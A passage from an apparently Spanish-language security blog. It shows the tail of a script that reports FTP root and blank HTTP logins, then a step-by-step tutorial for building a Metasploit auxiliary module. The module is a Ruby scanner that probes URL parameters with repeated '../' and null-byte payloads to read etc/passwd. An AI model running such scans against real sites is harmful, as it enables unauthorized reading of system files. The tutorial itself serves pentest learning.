</span><span class='line'>                <span class="kd">local</span> <span class="n">code</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">ftp</span><span class="p">.</span><span class="n">read_reply</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">message</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="s">User logged in, proceed.&quot;</span> <span class="k">then</span>
</span><span class='line'>                    <span class="k">return</span> <span class="n">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">root:&#39;</span><span class="o">..</span><span class="n">pass</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
</span><span class='line'>                <span class="k">end</span>
</span><span class='line'>            <span class="k">end</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">HTTP Blank Auth :)&#39;</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">Failed Auth :(&#39;</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Para terminar dejo una salida del script realizando un sondeo de prueba a la red xx.xxx.xx.x/24</p>

<p><img src="http://i.imgur.com/yNeg2Th.png"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Escribiendo un auxiliar para MSF]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/"/>
    <updated>2014-11-23T03:20:10+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/23/escribiendo-un-auxiliar-para-msf</id>
    <content type="html"><![CDATA[<p><img src="http://i.imgur.com/boJZ1iI.jpg"></p>

<p>La idea de comenzar a aprender ruby llego solo por el echo de poder ver en la consola del msf un auxiliar escrito por mi, la API de metasploit no es un muy complicadad de llevar y con solo unos dias de practica, y es mas, ya estando familiarizados con otros lenguajes similares como lo son python y perl la forma de tomar el control de ruby se hace mas llevadera que comenzar desde cero, <!--more-->por suspuesto no estoy diciendo que sean realmente identicos pero ambos lenguajes poseen ciertas caracteristicas como la sencilles de su sintaxis, entre otras.</p>

<p>Durante este tutorial se mostrara paso a paso como aderir nuestra herramienta escrita en ruby como modulo auxiliar de msf. Para ello programe un sencillo scanner de LFI.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/ruby</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Autor: [Q]3rV[0]</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">host</span><span class="o">=</span><span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">data</span> <span class="o">=~</span> <span class="sr">/root:/</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Parametro vulnerable a LFI -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Not Found -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">lfi</span><span class="p">(</span><span class="n">web</span><span class="p">,</span> <span class="n">pb</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">a</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">while</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">pb</span>
</span><span class='line'>        <span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">traversal</span><span class="o">=</span><span class="s2">&quot;../&quot;</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">file</span>
</span><span class='line'>        <span class="n">vector</span><span class="o">=</span><span class="n">web</span><span class="o">+</span><span class="n">traversal</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">data</span><span class="o">=</span><span class="n">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd%00&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Se le debera pasar como argumentos el parametro vulnerable y un numero que indicara la cantidad de ‘../’  que realizara la inyeccion.</p>

<p><img src="http://i.imgur.com/w3ALLIF.png"></p>

<p>Lo primero que haremos sera importar el modulo msf/core y crer una clase en la cual heredaremos los metodos de Msf::Auxiliary.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Luego crearemos el metodo initialize que contendra dos funciones: super() y register_options().</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>super() contendra la informacion de nuestro auxiliar, tales como la version, el nombre del autor, la descripcion del modulo, etc.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Por otro lado register_options() contendra las opciones del auxiliar, y es donde definiremos los argumentos para luego setearlos desde msf.</p>

<p>La funcion tomara dos argumentos</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">register_options</span><span class="p">(</span><span class="o">[]</span><span class="p">,</span><span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Dentro del array definiremos las opciones teniendo tipos como:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">()</span> <span class="c1"># Para valores enteros</span>
</span><span class='line'><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">()</span> <span class="c1"># Para cadenas</span>
</span><span class='line'><span class="no">OptAddress</span><span class="o">.</span><span class="n">new</span><span class="p">()</span> <span class="c1"># Para direcciones</span>
</span></code></pre></td></tr></table></div></figure>


<p>En nuestro caso quedaria de la siguiente manera</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">(</span><span class="o">[</span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">),</span>
</span><span class='line'>                  <span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Path traversal&#39;</span><span class="o">]</span><span class="p">)</span><span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Fijense la sintaxis de Optxxx</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Recibe dos argumentos, el primero indica el nombre del parametro, el segundo es un array que contiene como primer indice un valor boleano que indica si es prescindible definir esa variable, y el segundo indice contiene la descripcion de la opcion.</p>

<p>Bien, ahora pasemos a la parte donde hubicaremos el codigo del scanner.</p>

<p>Definiremos otro metodo llamado run() donde incluiremos el codigo.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">(</span><span class="o">[</span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">),</span>
</span><span class='line'>                  <span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Path traversal&#39;</span><span class="o">]</span><span class="p">)</span><span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">host</span><span class="o">=</span><span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">data</span> <span class="o">=~</span> <span class="sr">/root:/</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Parametro vulnerable a LFI -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Not Found -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">lfi</span><span class="p">(</span><span class="n">web</span><span class="p">,</span> <span class="n">pb</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">a</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">while</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">pb</span>
</span><span class='line'>            <span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">traversal</span><span class="o">=</span><span class="s2">&quot;../&quot;</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">file</span>
</span><span class='line'>            <span class="n">vector</span><span class="o">=</span><span class="n">web</span><span class="o">+</span><span class="n">traversal</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">data</span><span class="o">=</span><span class="n">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd%00&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Pero todavia falta el pasaje de los argumentos y eso lo haremos con datastore[&lsquo;PARAMETRO&rsquo;], donde PARAMETRO seran los antes definidos con Optxxx.new()</p>

<p>Quedando finalizado nuestro modulo auxiliar para Msf.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">(</span><span class="o">[</span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">),</span>
</span><span class='line'>                   <span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Path traversal&#39;</span><span class="o">]</span><span class="p">)</span><span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
